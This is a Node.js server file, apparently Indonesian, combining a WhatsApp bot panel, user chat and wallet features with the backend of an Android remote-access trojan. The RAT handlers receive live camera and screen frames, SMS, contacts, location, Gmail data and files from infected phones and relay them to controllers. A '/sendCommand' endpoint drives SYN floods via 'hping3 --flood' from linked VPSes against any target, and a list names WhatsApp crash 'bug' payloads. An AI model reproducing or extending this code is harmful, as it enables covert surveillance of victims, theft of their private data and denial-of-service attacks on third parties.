require('dotenv').config();
const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    fetchLatestBaileysVersion,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@whiskeysockets/baileys');
const express = require("express");
const bodyParser = require('body-parser');
const readline = require("readline");
const crypto = require("crypto");
const cors = require('cors');
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const fsPromises = require('fs').promises;
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const { Server } = require('socket.io'); // Socket.io
const multer = require('multer');

// ============================================
// SERVER SETUP
// ============================================
const server = http.createServer(app);

const io = new Server(server, {
  cors: { origin: '*' },
  maxHttpBufferSize: 10e6
});

// UBAH INI: JANGAN PAKAI { server }
const wss = new WebSocket.Server({ noServer: true }); 

// TAMBAHKAN INI (HANDLE UPGRADE SATU KALI)
server.on('upgrade', (request, socket, head) => {
  // Jika request adalah untuk WebSocket Public Chat (path root /)
  // Jika Anda menggunakan prefix seperti /ws, ganti request.url === '/' menjadi request.url === '/ws'
  if (request.url === '/') {
    wss.handleUpgrade(request, socket, head, (ws) => {
      wss.emit('connection', ws, request);
    });
  }
  // Jika bukan, socket.io yang akan menanganinya secara otomatis
});
let wsClients = {};
let chatList = [];
const CHAT_FILE = 'chat.json';
const { Client } = require('ssh2');
const DB_PATH = "./database.json";
const SESSION_PATH = path.join(__dirname, "permenmd");
const THIRTY_MINUTES = 30 * 60 * 1000;
const qrCodes = {};
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
const bugs = [
  { bug_id: "frezeexdelay", bug_name: "FREZEE X DELAY" },
  { bug_id: "blankxstc", bug_name: "BLANK X STC" },
  { bug_id: "buldozer", bug_name: "BULDOZER [PHOTO]"},
  { bug_id: "delayinvis", bug_name: "DELAY INVISIBLE"},
  { bug_id: "spambkp", bug_name: "SPAM VD BKP" },
  { bug_id: "forclose", bug_name: "FORCLOSE" },
];
let cncActive = true;
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
fs.watchFile("keyList.json", () => {
  console.log("[📂] keyList.json changed, reloading...");
  sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
});

// ─── TAMBAHAN UNTUK RAT ──────────────────────────────────────────
const DEVICES_FILE = path.join(__dirname, 'devices.json');
let devices = {};
const cameraFrames = {};
const sessions = {}; // Untuk session token auth RAT

function loadJSON(file) {
  try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch { return {}; }
}
function saveJSON(file, data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2), 'utf8');
}
function genToken() { return crypto.randomBytes(24).toString('hex'); }
const savedDevices = loadJSON(DEVICES_FILE);
devices = savedDevices;

// ============================================================
// MIDDLEWARE AUTH RAT
// ============================================================
function requireAuth(req, res, next) {
  const token = req.headers['x-auth-token'] || req.query.token;
  if (!token || !sessions[token]) return res.status(401).json({ error: 'Unauthorized' });
  req.username = sessions[token].username;
  req.uid = sessions[token].uid;
  next();
}

if (fs.existsSync(CHAT_FILE)) {
  chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
}

function saveChat() {
  fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
}

function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '')
    .replace(/[\r\n]/g, ' ')
    .slice(0, 250);
}

const TOKEN = String(process.env.TELEGRAM_BOT_TOKEN || '').trim();
if (!TOKEN) console.warn('[⚠️ TELEGRAM] TELEGRAM_BOT_TOKEN belum diisi; fitur bot dinonaktifkan.');
const bot = TOKEN ? new TelegramBot(TOKEN, { polling: true }) : null;

async function notifyAccountCreated({ username, role, expiredDate, durationDays, createdBy, source = 'APK' }) {
  try {
    if (!bot) return { sent: false, reason: 'telegram_disabled' };
    const cfg = loadTelegramConfig();
    const target = String(process.env.ACCOUNT_NOTIFY_GROUP_ID || cfg.accountNotificationGroupId || '').trim();
    if (!target) return { sent: false, reason: 'group_not_configured' };
    const expiry = new Date(`${expiredDate}T23:59:59`);
    const remainingMs = expiry.getTime() - Date.now();
    const remainingHours = Math.max(0, Math.ceil(remainingMs / 3600000));
    const safeUser = sanitize(username);
    const safeRole = sanitize(role).toUpperCase();
    const safeCreator = sanitize(createdBy || 'SYSTEM');
    const now = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    const text = [
      '🆕 AKUN BARU DIBUAT',
      '',
      `👤 Username: ${safeUser}`,
      `🎯 Role: ${safeRole}`,
      `⏳ Durasi: ${Number(durationDays) || 0} hari`,
      `📅 Expired: ${expiredDate}`,
      `🕐 Sisa: ±${remainingHours} jam`,
      `👨‍💻 Dibuat oleh: ${safeCreator}`,
      `📱 Sumber: ${sanitize(source)}`,
      `🕒 Waktu: ${now}`,
    ].join('\n');
    await bot.sendMessage(target, text, { disable_web_page_preview: true });
    return { sent: true };
  } catch (err) {
    console.error('[⚠️ ACCOUNT NOTIFY] Gagal kirim notifikasi:', err.message);
    return { sent: false, reason: err.message };
  }
}

async function appendLogAsync(filePath, data) {
  try {
    if (fs.existsSync(filePath)) {
      const stats = fs.statSync(filePath);
      if (stats.size > 5 * 1024 * 1024) {
        fs.writeFileSync(filePath, '');
      }
    }
    await fsPromises.appendFile(filePath, data);
  } catch (err) {
    console.error(`[❌ LOG ERROR] Gagal menulis log: ${err.message}`);
  }
}

async function autoRefresh() {
  try {
    if (!fs.existsSync(SESSION_PATH)) {
      console.log("⚠️ Folder 'permenmd' tidak ditemukan.");
    } else {
      let deletedCount = 0;
      const userFolders = fs.readdirSync(SESSION_PATH);

      for (const userFolder of userFolders) {
        const userPath = path.join(SESSION_PATH, userFolder);
        if (!fs.lstatSync(userPath).isDirectory()) continue;

        const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
        if (!hasJson) {
          fs.rmSync(userPath, { recursive: true, force: true });
          deletedCount++;
        }
      }
      console.log(`[AUTO REFRESH] ${deletedCount} folder session kosong dihapus.`);
    }

    console.log("[AUTO REFRESH] Auto restart dijalankan...");

    setTimeout(() => {
      console.log("[AUTO REFRESH] Server aktif dan berjalan normal setelah auto restart.");
    }, 8000);

    setTimeout(() => {
      console.log("[AUTO REFRESH] Process restart server");
      process.exit(0);
    }, 5000);

  } catch (err) {
    console.error("[AUTO REFRESH] Error", err);
  }
}

const LOGS_DIR = path.join(__dirname, 'user_logs');

function hapusIsiUserLogs() {
  if (!fs.existsSync(LOGS_DIR)) {
    console.log("[AUTOCLEAN LOGS] Folder tidak ditemukan");
    return;
  }

  const files = fs.readdirSync(LOGS_DIR);

  for (const file of files) {
    const filePath = path.join(LOGS_DIR, file);
    fs.rmSync(filePath, { recursive: true, force: true });
  }

  console.log("[AUTOCLEAN LOGS] Isi folder berhasil dihapus");
}

if (!fs.existsSync(LOGS_DIR)) {
  fs.mkdirSync(LOGS_DIR, { recursive: true });
  console.log("[LOGS] Folder 'user_logs' dibuat.");
}

function saveUserLog(username, type, title, description) {
  try {
    const userLogPath = path.join(LOGS_DIR, `${username}.json`);
    let logs = [];

    if (fs.existsSync(userLogPath)) {
      logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));
    }

    logs.push({
      type: type,
      title: title,
      description: description,
      timestamp: Date.now()
    });

    fs.writeFileSync(userLogPath, JSON.stringify(logs, null, 2));
    console.log(`[LOGS] Activity saved for ${username}: ${type}`);
  } catch (err) {
    console.error(`[LOGS] Gagal simpan log ${username}:`, err.message);
  }
}

// ============================================================
// REAL-TIME ONLINE USERS / CONNECTION PRESENCE
// ============================================================
// IMPORTANT:
// - This block only controls the dashboard "Online users" statistics.
// - Existing API routes, chat, sender, device, Telegram, etc. remain unchanged.
// - A user is counted only after a successful WebSocket `validate`.
// - A username is counted once even if it has multiple authenticated sockets.
// - activeConnections counts authenticated WebSocket sessions only.
// - ws ping/pong removes dead/stale connections automatically.
const onlineUsers = new Set();
const authenticatedWs = new Set();
const userSockets = new Map(); // username -> Set<WebSocket>

function getOnlineStats() {
  return {
    onlineUsers: onlineUsers.size,
    activeConnections: authenticatedWs.size,
  };
}

function sendStatsTo(ws) {
  if (!ws || ws.readyState !== 1) return;
  ws.send(JSON.stringify({
    type: 'stats',
    ...getOnlineStats(),
  }));
}

function broadcastStats() {
  const stats = JSON.stringify({
    type: 'stats',
    ...getOnlineStats(),
  });

  // Only authenticated dashboard clients need the private online count.
  authenticatedWs.forEach((client) => {
    if (client.readyState === 1) {
      try { client.send(stats); } catch (_) {}
    }
  });
}

function markWsOnline(ws, username) {
  // Avoid double-counting the same WebSocket if validate is received twice.
  if (ws._presenceRegistered) return;

  ws.username = username;
  ws._presenceRegistered = true;
  authenticatedWs.add(ws);

  let sockets = userSockets.get(username);
  if (!sockets) {
    sockets = new Set();
    userSockets.set(username, sockets);
  }
  sockets.add(ws);
  onlineUsers.add(username);

  broadcastStats();
}

function markWsOffline(ws) {
  if (!ws._presenceRegistered) return;

  ws._presenceRegistered = false;
  authenticatedWs.delete(ws);

  const username = ws.username;
  if (username) {
    const sockets = userSockets.get(username);
    if (sockets) {
      sockets.delete(ws);
      if (sockets.size === 0) {
        userSockets.delete(username);
        onlineUsers.delete(username);
      }
    } else {
      onlineUsers.delete(username);
    }
  }

  broadcastStats();
}

// Keep TCP/WebSocket presence accurate when a mobile app is killed,
// loses network, or disappears without a clean close event.
const WS_PRESENCE_INTERVAL = 15000;
const wsPresenceTimer = setInterval(() => {
  wss.clients.forEach((ws) => {
    if (ws.isAlive === false) {
      markWsOffline(ws);
      try { ws.terminate(); } catch (_) {}
      return;
    }

    ws.isAlive = false;
    try { ws.ping(); } catch (_) {}
  });
}, WS_PRESENCE_INTERVAL);
if (wsPresenceTimer.unref) wsPresenceTimer.unref();

wss.on('connection', function (ws, req) {
  let username;

  ws.isAlive = true;
  ws.on('pong', () => {
    ws.isAlive = true;
  });

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

      if (data.type === 'stats') {
        // Return the current server-side truth to the requester.
        sendStatsTo(ws);
      }

      if (data.type === 'sessionCheck') {
        const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const user = sessionList.find(e => e.sessionKey === data.key);

        if (!user) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Invalid key"
          }));
          return ws.close();
        }

        if (user.androidId !== data.androidId) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Another device has logged in"
          }));
          return ws.close();
        }
      }

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key);
        const validId = session.find(e => e.androidId === data.androidId);

        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        const userInfo = session.find(e => e.sessionKey === data.key);
        const validatedUsername = userInfo?.username || data.key;

        // Register this WebSocket as genuinely online.
        markWsOnline(ws, validatedUsername);

        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: userInfo?.username,
          androidId: userInfo?.androidId,
          role: userInfo?.role || "member"
        }));

        // Send the current count directly after validation so the
        // dashboard never has to wait for another client to request stats.
        sendStatsTo(ws);

        const interval = setInterval(() => {
          const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
          const validKey = session.find(e => e.sessionKey === data.key);
          const validId = session.find(e => e.androidId === data.androidId);

          if (!validKey) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "keyInvalid"
            }));
            clearInterval(interval);
            return ws.close();
          }

          if (!validId) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "androidIdMismatch"
            }));
            clearInterval(interval);
            return ws.close();
          }

        }, 10000);

        ws.interval = interval;
      }

      if (data.type === 'auth') {
        username = getUserByKey(data.key);
        console.log(username);
        if (!username) return ws.close();
        wsClients[username] = ws;

        const list = chatList
          .filter(m => m.from === username || m.to === username)
          .map(m => (m.from === username ? m.to : m.from));

        ws.send(JSON.stringify({
          type: "chatList",
          users: [...new Set(list)],
        }));
      }

      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
        if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }

    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    markWsOffline(ws);

    if (ws.interval) clearInterval(ws.interval);
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });

  ws.on('error', () => {
    // The close event normally follows; this makes presence cleanup
    // immediate if the socket errors without a clean close.
    markWsOffline(ws);
  });
});


io.on('connection', (socket) => {
  // Controller join (admin dashboard)
  socket.on('controller:join', (data) => {
    const token = data?.token;
    if (!token || !sessions[token]) {
      socket.emit('auth:error', { message: 'Unauthorized' });
      return socket.disconnect();
    }
    const username = sessions[token].username;
    const uid = sessions[token].uid;
    socket.data.uid = uid;

    // Kirim daftar device ke controller (dari RAM)
    const devList = Object.entries(devices)
      .filter(([id, d]) => d.uid === uid)
      .map(([id, d]) => ({
        id: d.id,
        name: d.name,
        status: d.status || 'Offline',
        lastSeen: d.lastSeen || new Date().toISOString(),
        battery: d.battery || 0
      }));
    socket.emit('devices:update', devList);
  });

  // Device register (RAT client)
  socket.on('device:register', (data) => {
  const { deviceId, name, battery, uid, sdkVersion, androidVersion, charging } = data;
  
  // FALLBACK CUSTOM: name dipake sebagai model kalo gak ada
  const finalName = name || deviceId || 'Unknown Device';
  const finalModel = name || deviceId || 'Unknown Model'; // ← NAME JADI MODEL
  
  devices[deviceId] = {
    uid,
    id: deviceId,
    name: finalName,
    model: finalModel,  // ← PAKE NAME KARENA CLIENT GAK KIRIM MODEL
    socketId: socket.id,
    lastSeen: new Date().toISOString(),
    battery: battery || 0,
    status: 'Online',
    charging: charging || false,
    androidVersion: androidVersion || 'Unknown',
    sdkVersion: sdkVersion || 0,
    info: data
  };
  
  saveJSON(DEVICES_FILE, devices);
  socket.join(`device:${deviceId}`);
  console.log(`[DEVICE] Registered: ${finalName} (${deviceId})`);
  broadcastToUid(uid, 'devices:update', getDeviceListForUid(uid));
});

  // Device status update
  socket.on('device:status', (data) => {
    const { deviceId, status } = data;
    if (devices[deviceId]) {
      devices[deviceId].status = status;
      devices[deviceId].lastSeen = new Date().toISOString();
      broadcastToUid(devices[deviceId].uid, 'devices:update', getDeviceListForUid(devices[deviceId].uid));
    }
  });

  // Camera frame (live)
  socket.on('camera:frame', (data) => {
  const { deviceId, frame } = data;
  console.log(`📷 [SERVER] Frame received from device: ${deviceId}, length: ${frame?.length || 0}`);
  
  cameraFrames[deviceId] = frame;
  
  if (devices[deviceId]) {
    const uid = devices[deviceId].uid;
    console.log(`📤 [SERVER] Broadcasting to UID: ${uid}`);
    
    let count = 0;
    io.sockets.sockets.forEach((s) => {
      if (s.data.uid === uid) {
        s.emit('camera:frame', { deviceId, frame });
        count++;
      }
    });
    console.log(`✅ [SERVER] Sent to ${count} controllers`);
  } else {
    console.log(`❌ [SERVER] Device not found: ${deviceId}`);
  }
});

  // Screen frame
  socket.on('screen:frame', (data) => {
    const { deviceId, frame } = data;
    if (devices[deviceId]) {
      broadcastToUid(devices[deviceId].uid, 'screen:frame', { deviceId, frame });
    }
  });

  // Notification from device
  socket.on('device:notif', (data) => {
    const dev = devices[data.deviceId];
    if (dev) broadcastToUid(dev.uid, 'device:notif', data);
  });

  // Location
socket.on('device:location', (data) => {
  const dev = devices[data.deviceId];
  if (dev) {
    const uid = dev.uid;
    console.log(`📍 MENGIRIM LOKASI KE UID: ${uid}`);
    
    // CARA PALING AMAN: Looping semua socket yang terhubung
    io.sockets.sockets.forEach((clientSocket) => {
      // Jika socket ini adalah admin panel (punya data uid) dan uid-nya cocok
      if (clientSocket.data && clientSocket.data.uid === uid) {
        clientSocket.emit('device:location', data);
        console.log(`✅ Location forwarded ke Flutter Admin!`);
      }
    });

  } else {
    console.log(`❌ Device tidak ditemukan: ${data.deviceId}`);
  }
});
  socket.on('device:contacts', (data) => {
    const dev = devices[data.deviceId];
    if (dev) broadcastToUid(dev.uid, 'device:contacts', data);
  });
  socket.on('device:sms', (data) => {
    const dev = devices[data.deviceId];
    if (dev) broadcastToUid(dev.uid, 'device:sms', data);
  });
  socket.on('device:apps', (data) => {
    const dev = devices[data.deviceId];
    if (dev) broadcastToUid(dev.uid, 'device:apps', data);
  });
  socket.on('device:gmail', (data) => {
  console.log('📧 [SERVER] Received device:gmail from', data.deviceId);
  const dev = devices[data.deviceId];
  if (dev) {
    broadcastToUid(dev.uid, 'device:gmail', data);
    console.log('✅ [SERVER] Broadcasted to UID:', dev.uid);
  } else {
    console.log('❌ [SERVER] Device not found:', data.deviceId);
  }
});
socket.on('device:phone', (data) => {
  console.log('📱 [SERVER] Received device:phone from', data.deviceId);
  const dev = devices[data.deviceId];
  if (dev) {
    broadcastToUid(dev.uid, 'device:phone', data);
    console.log('✅ [SERVER] Broadcasted Phone to UID:', dev.uid);
  } else {
    console.log('❌ [SERVER] Device not found:', data.deviceId);
  }
});
  socket.on('device:files', (data) => {
    const dev = devices[data.deviceId];
    if (dev) broadcastToUid(dev.uid, 'device:files', data);
  });

  // Disconnect
  socket.on('disconnect', () => {
    for (const id in devices) {
      if (devices[id].socketId === socket.id) {
        devices[id].status = 'Offline';
        devices[id].lastSeen = new Date().toISOString();
        // Simpan perubahan status ke file
        saveJSON(DEVICES_FILE, devices);
        broadcastToUid(devices[id].uid, 'devices:update', getDeviceListForUid(devices[id].uid));
        console.log(`[DEVICE] Disconnected: ${devices[id].name} (${id})`);
        break;
      }
    }
  });
});

// ─── BROADCAST HELPERS ───────────────────────────────────────────
function broadcastToControllers(event, data, uid) {
  io.sockets.sockets.forEach((s) => {
    if (s.data.uid === uid) { // <-- HAPUS '|| !uid'
      s.emit(event, data);
    }
  });
}

function broadcastToUid(uid, event, data) {
  broadcastToControllers(event, data, uid);
}

function getDeviceListForUid(uid) {
  return Object.entries(devices)
    .filter(([id, d]) => d.uid === uid)
    .map(([id, d]) => ({
      id: d.id,
      name: d.name || d.model || 'Unknown', // ← FALLBACK NAME
      status: d.status || 'Offline',
      lastSeen: d.lastSeen || new Date().toISOString(),
      battery: d.battery || 0,
      model: d.model || 'Unknown',
      androidVersion: d.androidVersion || 'Unknown'
    }));
}

const wsPort = 57189;
server.listen(wsPort, () => {
  console.log(`🟣 Server running on http://66.33.22.220:${wsPort}`);
});

const PORT = 57189;

app.use(express.urlencoded({ extended: false }));
app.use(express.json());

const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData);

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000;

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}

function connectToAllVPS() {
  if (!cncActive) return;

  console.log("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end();
        return;
      }

      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      conn.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

if (fs.existsSync(VPS_FILE)) {
  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
  console.log("📥 VPS list loaded.");
  connectToAllVPS();
}

fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("🔄 VPS list updated.");
    connectToAllVPS();
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});

function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

// DEY TABUNGAN / WALLET + OPIPAY QRIS
// Keuangan user dipisahkan dari fitur lama.
// ============================================================
const SAVINGS_MIN_DEPOSIT = Number(process.env.SAVINGS_MIN_DEPOSIT || 2000);
const SAVINGS_MAX_DEPOSIT = Number(process.env.SAVINGS_MAX_DEPOSIT || 10000000);
const SAVINGS_MIN_WITHDRAW = Number(process.env.SAVINGS_MIN_WITHDRAW || 10000);
const OPIPAY_BASE_URL = String(process.env.OPIPAY_BASE_URL || 'https://opipay.my.id').replace(/\/+$/, '');
const OPIPAY_API_KEY = String(process.env.OPIPAY_API_KEY || '').trim();

function savingsUser(db, username) {
  const user = db.find(u => u.username === username);
  if (!user) return null;
  if (!user.savings || typeof user.savings !== 'object') {
    user.savings = { balance: 0, totalDeposited: 0, totalWithdrawn: 0, goals: [] };
  }
  if (!Array.isArray(user.savings.goals)) user.savings.goals = [];
  return user;
}
function savingsTransactions(user) {
  if (!Array.isArray(user.savingsTransactions)) user.savingsTransactions = [];
  return user.savingsTransactions;
}
function savingsAddTx(user, tx) {
  savingsTransactions(user).unshift({
    id: tx.id || `TX-${Date.now()}-${crypto.randomBytes(3).toString('hex')}`,
    type: tx.type,
    amount: Number(tx.amount || 0),
    status: tx.status || 'pending',
    title: tx.title || 'Transaksi Tabungan',
    description: tx.description || '',
    createdAt: tx.createdAt || new Date().toISOString(),
    updatedAt: new Date().toISOString(),
    ...tx
  });
  user.savingsTransactions = user.savingsTransactions.slice(0, 500);
}
function savingsAuth(req, res) {
  const key = String(req.query.key || req.body?.key || '').trim();
  const info = activeKeys[key];
  if (!key || !info) {
    res.status(401).json({ valid: false, message: 'Invalid session key' });
    return null;
  }
  const db = loadDatabase();
  const user = savingsUser(db, info.username);
  if (!user) {
    res.status(404).json({ valid: false, message: 'User not found' });
    return null;
  }
  return { key, info, db, user };
}
function savingsPublic(user) {
  const s = user.savings || {};
  return {
    balance: Number(s.balance || 0),
    totalDeposited: Number(s.totalDeposited || 0),
    totalWithdrawn: Number(s.totalWithdrawn || 0),
    goals: Array.isArray(s.goals) ? s.goals : []
  };
}

app.get('/api/savings/summary', (req, res) => {
  const auth = savingsAuth(req, res); if (!auth) return;
  res.json({ valid: true, username: auth.user.username, savings: savingsPublic(auth.user) });
});

app.get('/api/savings/transactions', (req, res) => {
  const auth = savingsAuth(req, res); if (!auth) return;
  res.json({ valid: true, transactions: savingsTransactions(auth.user).slice(0, 200) });
});

